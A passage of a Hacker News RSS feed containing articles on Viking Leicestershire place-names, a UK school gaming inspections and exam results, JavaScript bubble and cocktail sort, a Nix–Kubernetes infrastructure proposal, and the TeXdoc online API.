safety at Dorchester-on-Thames. It would be more than a thousand years before
there would again be a Diocese of Leicester. Leicester, with Derby, Nottingham,
Lincoln and Stamford, became one of the “Five Boroughs” of the Danelaw. Leicester,
as a former Anglo-Saxon royal city, continued its importance under Danish rule.
Danish forms of taxation and local government took root in Leicester.</span></p>

<p><b><span>Danish Leicester</span></b></p>
<p><span>Although the Danelaw’s existence was
relatively short-lived, it left an everlasting mark on the history of
Leicestershire. The Scandinavians left an indelible impression on the language
of the East Midlands. </span><span>&nbsp;</span><span>Vocabulary,
grammatical structures and the very tones of local dialect were deeply affected
by the contact with Scandinavia. Despite this, there aren’t many archeological
finds to be seen; visible remains of the Norsemen are hard to come by. Leicestershire’s
archaeological record lacks burials, pottery and everyday implements.</span></p>

<p><span>Finds that we do have are generally
personal ornaments such as brooches, horse accessories, coinage and weaponry. There
are also some distinctly Irish objects found in Leicestershire that were
probably plundered by Vikings during raids, and transported back to the Danelaw
lands. Such finds include a “shrine mount” from Breedon and belt buckles from
Melton.</span></p>

<p><span>Our understanding of Danish settlement
and the geography of the Danelaw depends largely on the evidence of
Scandinavian place-names. The place-name ending of by, which means a farm or
more usually a settlement, is seen throughout Denmark. That same ending is
common in England too. In Leicestershire alone, 56 villages end in by (such as Oadby)
and of these, half the number contain a Danish personal name as their other
element. But towards Leicester, on the broad gravel spreads where the River
Wreake empties into the Soar, the character of place-names changes. The sounds
of the Scandinavian invaders gives way to names of an older Mercian origin with
names ending in -ton. Thrussington, Syston and Cossington all speak of an
earlier period in Leicestershire’s settlement history. Even though the ton
element suggests the presence of a settlement that survived the impact of the
Danish army, the first element in these names is frequently a Scandinavian
personal name. Many Leicestershire villages were named after powerful Danes.
Ingarsby is named after the Danish Prince Ingar and it is now believed that
Humberstone may be named after Ingar’s brother, Hubba. </span><span>&nbsp;</span><span>Both Princes entered Leicester during the
Danish invasion and could have settled in the villages named after themselves.</span></p>

<table><tbody>
<tr><td><a href="http://4.bp.blogspot.com/-ij1MO4XWLvQ/UKS0APCvwSI/AAAAAAAAAgE/HVsFvpOADvw/s1600/Viking+Princes.jpg" imageanchor="1"><img height="320" src="https://4.bp.blogspot.com/-ij1MO4XWLvQ/UKS0APCvwSI/AAAAAAAAAgE/HVsFvpOADvw/s320/Viking+Princes.jpg" width="295"></a></td></tr>
<tr><td>Some think the Viking princes are on the tower of Humberstone church</td></tr>
</tbody></table>
<p><span>But as well as being named after actual
people, many villages were named after the gods. Thurmaston, Thurcaston,
Thurlaston and Thurnby all owe their name to one of the principal pagan gods of
the Scandinavian culture – Thor, who together with Odin, were the most commonly
worshipped gods. An archaeological find from Leicestershire of a miniature
“Thor’s Hammer”, the god’s famous magical weapon, is on display in the Jewry
Wall Museum.</span></p>

<table><tbody>
<tr><td><a href="http://3.bp.blogspot.com/-1ehV6iV7B9k/UKSyduMs2kI/AAAAAAAAAfs/-kxLGS5K0VU/s1600/thor+hammer.jpg" imageanchor="1"><img height="210" src="https://3.bp.blogspot.com/-1ehV6iV7B9k/UKSyduMs2kI/AAAAAAAAAfs/-kxLGS5K0VU/s320/thor+hammer.jpg" width="320"></a></td></tr>
<tr><td>Miniature Thor's Hammer&nbsp; found in Leicestershire</td></tr>
</tbody></table>

<p><b><span>Names are clues</span></b></p>
<p><span>With invading forces, you may assume
that they would settle on the broad and fertile river terraces of the Soar. But
settlements already existed here and new areas of land were needed to house the
large band of men who came to dwell in Leicestershire. By the study of
place-names, it appears that they turned towards the emptier and perhaps less
rewarding river terraces that flank the narrow valley of the Wreake. Along that
river we find Frisby, Hoby, Rotherby, Brooksby and Rearsby. The word “Wreake”
is also derived from Scandinavia, being the Old Norse word for “twisted”. So,
Wreake is both a description and the new name for the river once known as the
River Eye. Historian Sir Frank Stenton said the Wreake settlement was occupied
by a large body of the Danish army who took permanent occupation of the land
some time around 877.</span></p>

<p><span>The army would have been stationed here
so it could spring to the defence of Leicester if the town was ever threatened
by invaders from the west. Another Danish encampment is thought to have stood
on the area of Leicester known as Dane Hills. The creation of the Danelaw made
as great an impression on Leicester as in the surrounding countryside. The
colonising Danes, soldiers and farmers, turned the Mercian cathedral city into
a garrison town. The term “gate,” descended from the Old Norse, “gata,” meaning
a street, occurs in a handful of streets in the heart of Leicester. All in the
same part of town we find Gallowtree Gate, Humberstone Gate, Church Gate,
Belgrave Gate and Sanvey Gate. They lie outside the line of the former Roman
and medieval wall, beyond the bounds of the Anglo-Saxon town. As we all know,
the first four streets converge at the Clock Tower where High Street passed
through the former East Gate out of the walled enclosure of the medieval town. Thus,
the presence of the “gata” element in modern street names of Leicester suggests
that the Danes, when they made Leicester one of their strongholds, established
a new town outside the wall of the Mercian city. By the early years of the 10th
century, Leicester may have been like a town of two halves, sharply divided
into Anglo-Saxon and Danish quarters.</span></p>

<p><b><span>Fresh …</span></b></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.thiswasleicestershire.co.uk/2012/11/the-viking-invasion-of-leicestershire.html">http://www.thiswasleicestershire.co.uk/2012/11/the-viking-invasion-of-leicestershire.html</a></em></p>]]>
            </description>
            <link>http://www.thiswasleicestershire.co.uk/2012/11/the-viking-invasion-of-leicestershire.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26212092</guid>
            <pubDate>Sun, 21 Feb 2021 09:25:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How my school gamed the stats]]>
            </title>
            <description>
<![CDATA[
Score 142 | Comments 157 (<a href="https://news.ycombinator.com/item?id=26211921">thread link</a>) | @optimalsolver
<br/>
February 21, 2021 | https://www.greaterwrong.com/posts/Yv9aj9bWD5H7aaDdy/how-my-school-gamed-the-stats | <a href="https://web.archive.org/web/*/https://www.greaterwrong.com/posts/Yv9aj9bWD5H7aaDdy/how-my-school-gamed-the-stats">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I was reading the Slate Star Codex <a href="https://astralcodexten.substack.com/p/book-review-the-cult-of-smart">review</a> of The Cult of Smart. Part of it discusses charter vs state schools and the allegations of fraud of various kinds undermining charter schools record of better achievement. Reading it, I realized that I took for granted that public schools engage in systematic fraud in a variety of ways. I donâ€™t think this is something everyone understands, hence this post.</p>
<p>I went to a state school in the UK. State schools are rated on a 1 âˆ’ 4 scale from unsatisfactory to outstanding. My school was rated good, meaning a 3. A few memories which stand out. During my first week I saw one of the boys in my class who was 11 at the time held up against the wall in a corridor while a 16 year old put a shiv to his throat and robbed him. He handed over his wallet and keys. A year or two later and I remember seeing a small boy who struggled with depression held up by the throat against a locker and slapped in the face by a troublemaker from the same class in front of everyone just before we went in to the classroom. I remember classes which were filled start to finish with people shouting and talking. Neither of the first two events were common but they also werenâ€™t uncommon. No one was surprised to witness them. Itâ€™s worth emphasizing again that my school was above average, in fact quite far above average, and in a middle class area. Itâ€™s also worth noting that I was mostly in top ability streamed classes, meaning my classroom experience was likely far better than average.</p>
<p>There were many ways in which the school and teachers gamed the system to boost their measured performance. One way was to do exams for students. I was on a bottom set language class for French. After two years I literally couldnâ€™t speak a single sentence in french and maybe knew 20 words in total. I still passed my exams. How? We did the tests in class. Often the teacher would go through them with us. Literally giving us the test and then going through each question on the whiteboard and telling us what to write. A different year and a different teacher, this time the teacher would sit next to us and write the answers down. Why sit next to us? It was the bottom set so people often wouldnâ€™t even bother to write down the answer if they were told it. This kind of thing was normal, so much so that I, and I think most people there, didnâ€™t realize anything unusual was happening.</p>
<p>Another way schools game metrics is to cheat inspections. A major component of how schools are judged in the UK is through independent inspections carried out by an independent quasi-governmental organization called Ofsted. Now, you may imagine that these inspections would be unannounced, so as to best get a real image of how a school works. Not the case. Theyâ€™re scheduled well in advance. Before every inspection, a few things would happen in my school:</p>
<ul><li><p>The worst troublemaker kids would be taken aside and put in a special room where inspectors wouldnâ€™t see them. Either that or they would just be told not to come into school at all on that day.</p></li><li><p>All of us were told in assembly that an inspection was coming and to be on our best behavior on that day. Often teachers would have conversations with less serious troublemakers and impress on them that they would behave on that day or face consequences afterwards.</p></li><li><p>Teachers would put a great deal more effort into their lesson plans than was normal. Classroom behavior management would also be far stricter.
Because of these and other measures my school during an inspection was utterly different than my school on a normal day. On some level this isnâ€™t surprising. If teachersâ€™ promotions and managementâ€™s jobs depend on good inspection results and inspections are easy to game, people will game them. Incentives drive behavior. But itâ€™s still sad.</p></li></ul>
<p>Another way the stats were gamed was by not recording bad behavior. When a school gives a detention or suspends/â€‹expels a student, thereâ€™s a record of it. This is especially true of suspensions, students being sent home or expulsions. The more of these you have, the worse you look as a school. The solution then is obvious, donâ€™t punish people or punish them in non-recorded ways. Again, in my school it was completely normal for students in lower sets to swear at the teacher, talk over them or disrupt the class for everyone else. It was normal for someone to be aggressive and abusive towards others and to face at most a 40 minute detention, but even getting a detention would be unusual.</p>
<p>I realize that one data point is not enough to draw solid general conclusions. My own perception is that this kind of fraud wasnâ€™t specific to my school. My cousin went to a state school fairly nearby. Heâ€™s 4 years younger than me. During one of my winters back from undergrad we discussed his school and his experiences mirrored mine. His exact words regarding inspections were â€œI learned 4 times more that day than any other day that year. It was amazingâ€�. I talked to a few British students at university, although specifically the not middle/â€‹upper class ones who would have gone to public schools. They had gone to schools similar to mine in different parts of the country and their stories were similar and often worse. Two particularly funny examples from my friendsâ€™ experiences stand out. A teacher in year 9 walked up to a student who was talking, picked them up and threw them out of an (open) first floor window. My friend sitting in class noticed two boys making fun of him and then proceeded to get up in the middle of class while the teacher was talking, walk to their table, flip the table upwards to hit them in the face before going to sit down again when the teacher told him to. (Remember, my friend was a studious, sporty Asian kid and not a troublemaker. This kind of thing is normal in that environment). Comedic stories aside, my experiences in school, while not universal, seem fairly common in the UK and from what Iâ€™ve read of the statistics, bad US schools are far, far worse.</p>
<p>Iâ€™m unsure what my point here is. I think I have two:</p>
<ul><li><p>Charters may cook their books in various ways. In the UK, State schools do too. I would be surprised if it wasnâ€™t also the case in the US.</p></li><li><p>I think that I feel like a lot of commentators on places like SSC have fairly middle class experiences of fairly good schools and that bleeds into how their comparison between state vs charter schools. Itâ€™s just good to remember that itâ€™s not those nice middle class schools that charters typically replace.</p></li></ul>
<p>Crossposted to my blog at <a href="https://dissent.blog/2021/02/20/how-my-school-gamed-the-stats/">https://â€‹â€‹dissent.blog/â€‹â€‹2021/â€‹â€‹02/â€‹â€‹20/â€‹â€‹how-my-school-gamed-the-stats/â€‹â€‹</a></p></div></div>]]>
            </description>
            <link>https://www.greaterwrong.com/posts/Yv9aj9bWD5H7aaDdy/how-my-school-gamed-the-stats</link>
            <guid isPermaLink="false">hacker-news-small-sites-26211921</guid>
            <pubDate>Sun, 21 Feb 2021 08:44:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Optimized bubble sort in JavaScript. Cocktail sort]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26211514">thread link</a>) | @chovybizzass
<br/>
February 20, 2021 | https://learn.coderslang.com/0037-javascript-optimized-bubble-sort.-coctail-sort/ | <a href="https://web.archive.org/web/*/https://learn.coderslang.com/0037-javascript-optimized-bubble-sort.-coctail-sort/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><a href="https://learn.coderslang.com/0036-javascript-bubble-sort/" target="_blank">Bubble sort algorithm</a>
doesn’t track the current state of the array.</p><p>Even if it gets the fully sorted array as an input, the runtime will remain of the same <strong>O(n^2^)</strong> complexity. By design this algorithm analyses all the adjacent pairs of elements of the original array <strong>n</strong> times where <strong>n</strong> is the length of an array.</p><h2 id="optimized-bubble-sort">Optimized bubble sort</h2><p>The bubble sort algorithm doesn’t keep track of the current state of the array in any way.</p><p>Even if we send an already sorted array as input, we will need the same number of loop iterations as for an unsorted array to get the result.</p><p>Performance can be improved by adding a flag (boolean variable) that will monitor whether there was at least one exchange at the current iteration.</p><p>If not, then the array is sorted and the task is complete.</p><div><pre><code data-lang="js"><span>const</span> <span>optimizedBubbleSort</span> <span>=</span> (<span>arr</span>) =&gt; {
  <span>let</span> <span>hasSwapped</span> <span>=</span> <span>false</span>;
  <span>let</span> <span>outerLoopIterationCount</span> <span>=</span> <span>0</span>;
  
  <span>for</span> (<span>let</span> <span>i</span> <span>=</span> <span>0</span>; <span>i</span> <span>&lt;</span> <span>arr</span>.<span>length</span>; <span>i</span><span>++</span>) {
    <span>for</span> (<span>let</span> <span>j</span> <span>=</span> <span>0</span>; <span>j</span> <span>&lt;</span> <span>arr</span>.<span>length</span> <span>-</span> <span>i</span>; <span>j</span><span>++</span>) {
      <span>if</span> (<span>arr</span>[<span>j</span>] <span>&gt;</span> <span>arr</span>[<span>j</span> <span>+</span> <span>1</span>]) {
        <span>hasSwapped</span> <span>=</span> <span>true</span>;
        <span>let</span> <span>tmp</span> <span>=</span> <span>arr</span>[<span>j</span>];
        <span>arr</span>[<span>j</span>] <span>=</span> <span>arr</span>[<span>j</span> <span>+</span> <span>1</span>];
        <span>arr</span>[<span>j</span> <span>+</span> <span>1</span>] <span>=</span> <span>tmp</span>;
      }
    }
    <span>if</span> (<span>!</span><span>hasSwapped</span>) {
      <span>return</span> <span>outerLoopIterationCount</span>;
    } <span>else</span> {
      <span>hasSwapped</span> <span>=</span> <span>false</span>;
    }
    <span>outerLoopIterationCount</span><span>++</span>;
  }
  <span>return</span> <span>outerLoopIterationCount</span>;
}
</code></pre></div><p>Let’s take two arrays to check the implementation. The second one is twice as long as the first one, but it has only one element out of place.</p><ul><li>display the initial state of the arrays</li><li>we sort them and save the number of iterations that the <code>optimizedBubbleSort</code> sort function will return</li><li>display the arrays again to make sure that they are sorted and check the number of iterations it took to sort</li></ul><div><pre><code data-lang="javascript"><span>const</span> <span>testData</span> <span>=</span> [ <span>0</span>, <span>-</span><span>1</span>, <span>4</span>, <span>5</span>, <span>2</span>, <span>-</span><span>3</span> ];
<span>const</span> <span>almostSortedTestData</span> <span>=</span> [ <span>12</span>, <span>-</span><span>3</span>, <span>-</span><span>1</span>, <span>0</span>, <span>2</span>, <span>4</span>, <span>5</span>, <span>7</span>, <span>8</span>, <span>9</span>, <span>10</span> ];

<span>console</span>.<span>log</span>(<span>testData</span>, <span>`Initial testData state`</span>);
<span>console</span>.<span>log</span>(<span>almostSortedTestData</span>, <span>`Initial almostSortedTestData state`</span>);

<span>const</span> <span>iterationsTestData</span> <span>=</span> <span>optimizedBubbleSort</span>(<span>testData</span>);
<span>const</span> <span>iterationsAlmostSortedTestData</span> <span>=</span> <span>optimizedBubbleSort</span>(<span>almostSortedTestData</span>);

<span>console</span>.<span>log</span>(<span>testData</span>, <span>`Total iterations: </span><span>${</span><span>iterationsTestData</span><span>}</span><span>`</span>);
<span>console</span>.<span>log</span>(<span>almostSortedTestData</span>, <span>`Total iterations: </span><span>${</span><span>iterationsAlmostSortedTestData</span><span>}</span><span>`</span>);
</code></pre></div><p>The console output is:</p><div><pre><code data-lang="bash"><span>[</span> 0, -1, 4, 5, 2, -3 <span>]</span> Initial testData state
<span>[</span> 12, -3, -1, 0, 2, 4, 5, 7, 8, 9, <span>10</span> <span>]</span> Initial almostSortedTestData state

<span>[</span> -3, -1, 0, 2, 4, <span>5</span> <span>]</span> Total iterations: <span>6</span>
<span>[</span> -3, -1, 0, 2,  4, 5, 7, 8, 9, 10, <span>12</span> <span>]</span> Total iterations: <span>2</span>

</code></pre></div><p>Although the second array turned out to be 2 times longer than the first one, we only needed two iterations of the outer loop to sort it.</p><p>On the second pass, the <code>hasSwapped</code> flag has not changed. This means that there were no exchanges and the array has already been sorted. We completed the optimized bubble sort algorithm right away and wasted no extra time.</p><p>By the way, if we try to sort an array in which all elements are already arranged in ascending order using the <code>optimizedBubbleSort</code> function, then we will need only one iteration of the outer loop. So at best we get <strong>O(n)</strong> runtime complexity.</p><div><pre><code data-lang="javascript"><span>const</span> <span>testData</span> <span>=</span> [ <span>0</span>, <span>1</span>, <span>2</span>, <span>3</span>, <span>4</span>, <span>5</span>, <span>6</span> ];

<span>console</span>.<span>log</span>(<span>testData</span>, <span>`Initial testData state`</span>);

<span>const</span> <span>iterationsTestData</span> <span>=</span> <span>optimizedBubbleSort</span>(<span>testData</span>);

<span>console</span>.<span>log</span>(<span>testData</span>, <span>`Total iterations: </span><span>${</span><span>iterationsTestData</span><span>}</span><span>`</span>);
</code></pre></div><p>Вывод на экран:</p><div><pre><code data-lang="javascript">[ <span>0</span>, <span>1</span>, <span>2</span>, <span>3</span>, <span>4</span>, <span>5</span>, <span>6</span> ] <span>Initial</span> <span>testData</span> <span>state</span>
[ <span>0</span>, <span>1</span>, <span>2</span>, <span>3</span>, <span>4</span>, <span>5</span>, <span>6</span> ] <span>Total</span> <span>iterations</span><span>:</span> <span>1</span>
</code></pre></div><h2 id="cocktail-sort">Cocktail sort</h2><p>Cocktail sort is another enhancement of the bubble sort. Alternative names for this sorting algorithm are shaker sort or bidirectional sort.</p><p>We start in exactly the same way as in the bubble sort, and “push up” the maximum element. After that, we unfold and “push down” the minimum of the remaining elements.</p><p>Once we get to the beginning of the array, there will already be 2 elements in their places - the first and the last one. Thus, we will make 2 times less iterations of the outer loop. Due to this, the speed of the cocktail sort will be slightly higher than that of the bubble sort.</p><p>We’ll start with the small refactoring and extract the exchange function from our algorithm. We’ll call it <code>swap</code> :</p><div><pre><code data-lang="js"><span>function</span> <span>swap</span>(<span>arr</span>, <span>i</span>, <span>j</span>) {
  <span>let</span> <span>tmp</span> <span>=</span> <span>arr</span>[<span>i</span>];
  <span>arr</span>[<span>i</span>] <span>=</span> <span>arr</span>[<span>j</span>];
  <span>arr</span>[<span>j</span>] <span>=</span> <span>tmp</span>;
}
</code></pre></div><p>Then, we implement the cocktail sort in JavaScript:</p><div><pre><code data-lang="js"><span>function</span> <span>cocktailSort</span>(<span>arr</span>) {
  <span>let</span> <span>left</span> <span>=</span> <span>0</span>;
  <span>let</span> <span>right</span> <span>=</span> <span>arr</span>.<span>length</span> <span>-</span> <span>1</span>;
  <span>let</span> <span>hasSwapped</span> <span>=</span> <span>false</span>;
  <span>let</span> <span>outerLoopIterationCount</span> <span>=</span> <span>0</span>;

  <span>while</span> (<span>left</span> <span>&lt;</span> <span>right</span>) {
    <span>outerLoopIterationCount</span><span>++</span>;
    <span>for</span> (<span>let</span> <span>i</span> <span>=</span> <span>left</span>; <span>i</span> <span>&lt;</span> <span>right</span>; <span>i</span><span>++</span>) {
      <span>if</span> (<span>arr</span>[<span>i</span>] <span>&gt;</span> <span>arr</span>[<span>i</span> <span>+</span> <span>1</span>]) {
        <span>swap</span>(<span>arr</span>, <span>i</span>, <span>i</span> <span>+</span> <span>1</span>);
        <span>hasSwapped</span> <span>=</span> <span>true</span>;
      }
    }
    <span>right</span><span>--</span>;
    <span>for</span> (<span>let</span> <span>i</span> <span>=</span> <span>right</span>; <span>i</span> <span>&gt;</span> <span>left</span>; <span>i</span><span>--</span>) {
      <span>if</span> (<span>arr</span>[<span>i</span>] <span>&lt;</span> <span>arr</span>[<span>i</span> <span>-</span> <span>1</span>]) {
        <span>swap</span>(<span>arr</span>, <span>i</span>, <span>i</span> <span>-</span> <span>1</span>);
        <span>hasSwapped</span> <span>=</span> <span>true</span>;
      }
    }
    <span>left</span><span>++</span>;
    <span>if</span> (<span>!</span><span>hasSwapped</span>) {
      <span>return</span> <span>outerLoopIterationCount</span>;
    } <span>else</span> {
      <span>hasSwapped</span> <span>=</span> <span>false</span>;
    }
  }
  <span>return</span> <span>outerLoopIterationCount</span>;
}
</code></pre></div><p>And, using the same array, let’s make sure that there are indeed 2x less iterations of the outer loop:</p><div><pre><code data-lang="javascript"><span>const</span> <span>testData</span> <span>=</span> [ <span>0</span>, <span>-</span><span>1</span>, <span>4</span>, <span>5</span>, <span>2</span>, <span>-</span><span>3</span> ];

<span>console</span>.<span>log</span>(<span>testData</span>, <span>`Initial testData state`</span>);
<span>const</span> <span>iterationsTestData</span> <span>=</span> <span>cocktailSort</span>(<span>testData</span>);
<span>console</span>.<span>log</span>(<span>testData</span>, <span>`Total iterations: </span><span>${</span><span>iterationsTestData</span><span>}</span><span>`</span>);
</code></pre></div><p>As you see, the array is sorted and total iterations is <code>3</code> instead of <code>6</code> for the <code>optimizedBubbleSort</code>:</p><div><pre><code data-lang="js">[ <span>0</span>, <span>-</span><span>1</span>, <span>4</span>, <span>5</span>, <span>2</span>, <span>-</span><span>3</span> ] <span>Initial</span> <span>testData</span> <span>state</span>
[ <span>-</span><span>3</span>, <span>-</span><span>1</span>, <span>0</span>, <span>2</span>, <span>4</span>, <span>5</span> ] <span>Total</span> <span>iterations</span><span>:</span> <span>3</span>
</code></pre></div></div></div>]]>
            </description>
            <link>https://learn.coderslang.com/0037-javascript-optimized-bubble-sort.-coctail-sort/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26211514</guid>
            <pubDate>Sun, 21 Feb 2021 07:11:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Immutable Systems Infrastructure, or How to Mashup Kubernetes and Nix]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26211486">thread link</a>) | @harporoeder
<br/>
February 20, 2021 | https://tevps.net/blog/2021/2/20/immutable-systems-infrastructure-or-how-mashup-kub/ | <a href="https://web.archive.org/web/*/https://tevps.net/blog/2021/2/20/immutable-systems-infrastructure-or-how-mashup-kub/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
    
    
    <div>
        
        <h4>20 Feb 2021</h4>
        <p><a href="https://tevps.net/blog/Tools/">Tools</a>&nbsp;<a href="https://tevps.net/blog/Rant/">Rant</a>&nbsp;<a href="https://tevps.net/blog/DevOps/">DevOps</a></p><p>
        TL;DR: Proposal for a way to define multiple-machine systems in a immutable way, without requiring by-hand layouts.</p>
<p>I’ve been reading a lot about <a href="https://nixos.org/">Nix</a> and <a href="https://github.com/NixOS/nixops#nixops">NixOps</a> recently, and although I’m still leaning towards <a href="https://kubernetes.io/">Kubernetes</a> overall as my system configurator of choice (technically <a href="https://k3s.io/">k3s</a>, but that’s not so relevant for this), I’ve realised there’s a gap in the market for better immutable infrastructure. Note that this is a half-formed proposal, not a plan to do things, as I’ve already got way too many things on my plate, but I felt it was worth sharing the idea with others if anyone feels like picking this up, or doing something derived from it.</p>
<p>The goal is as follows: I want to be able to declare things like “I want X replicas of this service running, on different nodes” and “don’t put too many things on one node so the load gets well shared”, while not having to layout by hand <em>which</em> nodes the services go on, as they’re <a href="http://cloudscaling.com/blog/cloud-computing/the-history-of-pets-vs-cattle/">cattle not pets</a>. We can do this with Kubernetes right now, but at the cost of a system that tends towards being hard to debug when things go wrong, and things can <a href="https://k8s.af/">go very wrong</a>. It also has the limit that you have to containerise everything and isn’t really suited to managing local node setups (i.e. everything you need installed before you run the Kubernetes agent, like say ntp).</p>
<p>Nix OTOH, is absolutely designed for the local node setup, and NixOps would let us then setup multiple machines. However, NixOps is designed towards a “here’s a set of Nix expressions defining a series of specific machines”, and isn’t designed for any of the “choose where stuff goes for me” bits. These machines aren’t full-blown pets as they’re still automatically configured, but they’re not really fully cattle either.</p>
<p>We need a 3rd option: something with the best bits of both. Maybe it can be done with a variant of NixOps that defines a “basic node” config (stuff you want everywhere, like a specific kernel, ntp, maybe some firewall stuff), and then a series of “service” configs, that probably contain <a href="https://stackoverflow.com/a/58243920">an actual service config</a> and maybe any other packages/config that service needs, along with some metadata (e.g. replication count, memory/CPU requirements). It does need some sort of thing that decides “where does that particular service go” especially if the node that was carrying it goes down. Maybe we have some little service running on each node with <a href="https://raft.github.io/">Raft consensus</a> to decide what goes where, but all compiling down to Nix configurations for ease of debugging. It would also need to be able to cope with the upgrade case, plausibly by using the consensus system to replace a subset at a time of the services (or maybe some magic with unique names for services so we can run old version + new version at the same time)</p>
<p>Ideally, we also have something that lets us say spit out <a href="https://www.terraform.io/">Terraform</a> config for the more infrastructure things (NixOps supports AWS, Hetzner and GCE; Terraform supports <a href="https://registry.terraform.io/browse/providers">basically everything</a> and so it’s just easier that way), and then we can have a single config language that defines everything about our system’s setup other than the source code. And without needing to write <a href="https://octopus.com/blog/introduction-to-hcl-and-hcl-tooling">HCL</a>!</p>
<p>I would also note that I don’t regard Nix as the definitive option on system config languages. I think the immutable infrastructure approach is great, but the Nix language <a href="https://davedellacosta.com/posts/2019-03-29-why-nixos-is-hard-and-how-to-fix.html#what-is-so-hard">is kinda awful</a>. I’m somewhat more fond of <a href="https://guix.gnu.org/">Guix</a>, but I’ve used Nix here as the example as it’s the <a href="https://en.wiktionary.org/wiki/800-pound_gorilla">800-pound gorilla</a> in this space currently. I’m not sure what “better” looks like, other than liking the approach of using an existing language (as Guix does with <a href="https://www.gnu.org/software/guile/">Guile Scheme</a>) rather than building half of one along the way like Nix does.</p>
<p>Thoughts anyone?</p>
        <h4>
            Previously: <a href="https://tevps.net/blog/2020/9/7/scraping-lewishams-bin-days/">Scraping Lewishams bin days</a>
            
        </h4>
        
        
        
        
        
    </div>

    </div></div>]]>
            </description>
            <link>https://tevps.net/blog/2021/2/20/immutable-systems-infrastructure-or-how-mashup-kub/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26211486</guid>
            <pubDate>Sun, 21 Feb 2021 07:05:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[TeXdoc online: a web interface for TeX documentation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26211427">thread link</a>) | @nanna
<br/>
February 20, 2021 | https://texdoc.org/index.html | <a href="https://web.archive.org/web/*/https://texdoc.org/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="texdoconline-body">
      <p>
        Welcome to the <span>T<sub>e</sub>X</span> and <span>L<sup>a</sup>T<sub>e</sub>X</span> documentation lookup system.
      </p>
      
      
      
      <section>
        <h2>Our API</h2>
        <p>
          You are visiting the front-end for the <span>T<sub>e</sub>X</span>doc online software. In the backend, it is running a RESTful API that provides a few endpoints for you to use. Please make sure you read the following instructions about what to expect and what not to.
        </p>
        <p>
          Each of these requests will return either HTTP status code 200 (OK) or, in the case of any error, HTTP status code 422 (Unprocessable Entity). The <code>/version</code>endpoint is guaranteed not to fail.
        </p>
        <table>
          <thead>
            <tr>
              <th>Endpoint</th><th>Description</th>
            </tr>
          </thead>
          <tbody>
            <tr>
              <td><code>/version</code></td><td>This endpoint returns the versions of the API and data format (<code>api</code>), the installed version of texdoc (<code>texdoc</code>) and the date of the last <span>T<sub>e</sub>X</span> Live update as ISO date string (<code>tlpdb</code>). Make sure your client software always expects the correct API version to avoid problems. Our API versions follow semantic versioning with all its consequences.</td>
            </tr>
            <tr>
              <td><code>/texdoc/⟨name⟩</code></td><td>On this path, the list of entries is returned that a local call to <code>texdoc -l</code>would result in. For each entry, there are two fields:
                <ul>
                  <li>
                    <code>path</code> containing the path to the documentation file relative to the <code>doc</code> subfolder of the <code>TEXMFDIST</code> directory.
                  </li>
                  <li>
                    <code>description</code> containing the file's description if existent (empty otherwise).
                  </li>
                </ul>
                The application will always return a JSON array of such entries.</td>
            </tr>
            <tr>
              <td><code>/serve/⟨name⟩/⟨index⟩</code></td><td>This call results in the file corresponding to the documentation file at index <code>⟨index⟩</code> of the result of <code>/texdoc/⟨name⟩</code> being responded to the client.</td>
            </tr>
            <tr>
              <td><code>/pkg/⟨name⟩</code></td><td>This endpoint is actually a shortcut to the <code>/serve/⟨name⟩/0</code> endpoint previously introduced to preserve compatibility with the API of texdoc.net.</td>
            </tr>
            <tr>
              <td><code>/topics/list</code></td><td>This endpoint returns the list of topics known to the application specified by their <code>key</code> and a caption called <code>details</code>. This is a direct interface to CTAN's API for topics. Network access for the server software is required.</td>
            </tr>
            <tr>
              <td><code>/topic/⟨name⟩</code></td><td>This endpoint returns details for a topic by returning the <code>key</code> (what is passed in as <code>⟨name⟩</code>), a string with a short description called <code>details</code> and a list of package names (strings) called <code>packages</code>. This is a direct interface to CTAN's API for topics. Network access for the server software is required.</td>
            </tr>
          </tbody>
        </table>
      </section>
      <section>
        <h2>Deploying your own instance</h2>
        <h3>Running an executable JAR file</h3>
        <p>
          <span>T<sub>e</sub>X</span>doc online is an open-source product available at its <a href="https://gitlab.com/islandoftex/images/texdoc-online">GitLab repository page</a>. It consists of one server component that does host the API and the front-end at the same time. If you simply want to have these features available to you, download the latest build artifacts from there (i.e. the JAR file with dependencies) and run it with your local Java installation. Please note that the software requires a local <span>T<sub>e</sub>X</span> distribution installed and internet connection for fetching the topics.
        </p>
        <p>
          When running the JAR file, a local webserver will start up and host the service at <code>127.0.0.1:8080</code>which is configurable through the command-line switches. Calling this address will open up the web interface. Appending API paths will execute the API calls and return the JSON objects. To stop the server from running, simply <kbd>CTRL</kbd>+<kbd>C</kbd>the Java process.
        </p>
        <h3>Booting up a container</h3>
        <p>
          Alternatively, the preferred way to host your own instance should be running our Docker container (a list of available tags may be found<a href="https://gitlab.com/islandoftex/images/texdoc-online/container_registry">at GitLab</a>). The Docker container runs the web service as its entrypoint so running the server will start up the web server . Because the Docker container is built on top of our <span>T<sub>e</sub>X</span>Live images, it does not require a local <span>T<sub>e</sub>X</span> installation which might be beneficial for web servers. Internet connection is required,though. This all comes at the cost of being quite a big docker image of some gigabytes.
        </p>
        <p>
          If your Docker container runs for multiple days, it features an automated update of <span>T<sub>e</sub>X</span>Live. Every day at 00:01 in the morning, a full update of the distribution is performed updating to the latest and greatest package versions <span>T<sub>e</sub>X</span> Live has to offer. Please note, that updates between distribution releases will not be performed that way; in order to upgrade from TL&amp;nbsp;2020 to TL&amp;nbsp;2021 you would need to pull the latest Docker image again but that means that the need for re-pulling the Docker image reduces to once per year.
        </p>
